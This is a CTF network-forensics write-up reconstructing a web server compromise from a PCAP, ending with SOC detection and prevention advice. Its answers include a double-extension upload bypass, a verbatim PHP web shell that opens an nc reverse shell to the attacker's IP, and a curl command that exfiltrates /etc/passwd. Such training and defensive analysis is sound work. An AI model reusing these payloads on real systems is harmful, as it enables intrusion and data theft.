# WebStrike — CTF Writeup

**Platform**: CyberDefenders  
**Category**: Network Forensics / Web Shell  
**Difficulty**: Easy  
**Date**: May 2026  
**Author**: 0x4k4

---

## Challenge Overview

A company web server got hit. We're handed a PCAP and asked to reconstruct the attack from scratch: who did it, how they got in, what they dropped on the server, and what they tried to take. Six questions cover the full chain from initial recon to data exfiltration.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Wireshark | PCAP analysis, HTTP/TCP stream inspection, traffic filtering |
| WhatIsMyIPAddress | Geolocating the attacker's IP |

---

## Walkthrough

### 1. Finding the Attacker's IP

Opened the PCAP in Wireshark. The first thing I do on any PCAP challenge is look at who's talking to whom. The source IP sending the most requests was `117.11.88.124` — a lot of traffic concentrated on one address is a reliable early signal.

The other IP, `24.49.63.79`, was receiving all those requests, confirming it as the web server.

### 2. Geolocating the Source

Took `117.11.88.124` and ran it through [WhatIsMyIPAddress](https://whatismyipaddress.com/). Came back as Tianjin, China.

> **Q1**: Tianjin

### 3. Extracting the User-Agent

Filtered for GET requests to pull HTTP headers:

```
http.request.method == "GET"
```

Opened the Packet Details pane on one of the attacker's requests and read the User-Agent header directly:

```
Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

Linux-based Firefox. The attacker was spoofing a normal browser, probably to avoid standing out in web server logs.

> **Q2**: `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`

### 4. Finding the Web Shell

File uploads go through POST requests, so I filtered for those from the attacker's IP:

```
ip.src == 117.11.88.124 && http.request.method == "POST"
```

Two POST requests showed up, both targeting `/reviews/upload.php`.

First attempt: uploaded `image.php` with a PHP reverse shell payload. Server rejected it — `Invalid file format`.

Second attempt: renamed to `image.jpg.php`. Same payload. Server responded with `File uploaded successfully`. The double extension tricked the validation. The server was probably only checking the last extension or the MIME type the client sent, not the actual file content.

> **Q3**: `image.jpg.php`

### 5. Locating the Upload Directory

Since I had the filename, I searched for it in the traffic to track where it ended up. A GET request to `/reviews/uploads` returned a 301, redirecting to `/reviews/uploads/`. That's where the files land.

> **Q4**: `/reviews/uploads/`

### 6. Reverse Shell Port

Going back to the successful POST, the web shell payload was visible in the HTTP stream:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```

Port `8080` on the attacker's machine. Once the PHP file got executed on the server, it would call back to that port and hand over a shell.

> **Q5**: `8080`

### 7. Identifying the Exfiltration Target

Filtered for traffic from the server back to the attacker on port 8080:

```
ip.src == 24.49.63.79 && ip.dst == 117.11.88.124 && tcp.port == 8080
```

Followed the TCP stream. The attacker ran a few commands and then tried this:

```bash
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

They were sending `/etc/passwd` to their own machine over port 443. That file lists all system users — useful for mapping out the system and planning the next move.

> **Q6**: `passwd`

---

## Key Findings

| Finding | Value |
|---------|-------|
| Attacker IP | `117.11.88.124` |
| Web server IP | `24.49.63.79` |
| Attack origin | Tianjin, China |
| User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` |
| Web shell filename | `image.jpg.php` |
| Upload directory | `/reviews/uploads/` |
| Reverse shell port | `8080` |
| Exfiltration target | `passwd` |

---

## Lessons Learned

- **What I learned**: Double extension bypass is old but still works when servers validate by extension only. The fix is reading the actual file bytes (magic bytes), not trusting what the client claims.
- **What I'd do differently**: I would have gone straight to the POST filter instead of browsing endpoints first. On a small PCAP it doesn't matter, but on a large one it saves time.
- **Key concept**: A reverse shell inverts the connection. The server connects *out* to the attacker, which bypasses most inbound firewall rules. Detecting it means monitoring outbound connections from web server processes, not just inbound ones.

---

## SOC Perspective

### How to detect this attack

- **Outbound connections from web server processes**: A web server initiating TCP connections to external IPs on non-standard ports (like 8080) is a red flag. Set up alerts for this in your SIEM.
- **Double extension filenames in upload logs**: Log every uploaded filename. Alert on patterns like `*.php`, `*.php.*`, `*.asp.*`. No legitimate upload should have a double extension.
- **Web shell signatures in POST body**: Monitor POST request bodies for PHP execution functions: `system()`, `exec()`, `shell_exec()`, `passthru()`. A WAF inspecting request bodies catches this before it hits the server.
- **`curl` or `wget` spawned by the web server process**: If your web server process is running `curl` to an external IP, something is running code on the server. auditd on Linux or EDR tooling picks this up.

### How to prevent it

- **Validate file type using magic bytes server-side**. The client controls the MIME type and filename. The server has to read the actual file content to know what it really is.
- **Store uploads outside the web root**. Files in `/reviews/uploads/` should never be directly executable. Serve them through a controller script, not by letting the web server run them.
- **Default-deny egress rules on web servers**. A web server has no reason to initiate outbound connections to random IPs. That firewall rule would have killed the reverse shell before it connected.
- **Run the web server process with minimal privileges**. If it can't read `/etc/passwd` or spawn a shell, post-exploitation gets a lot harder fast.
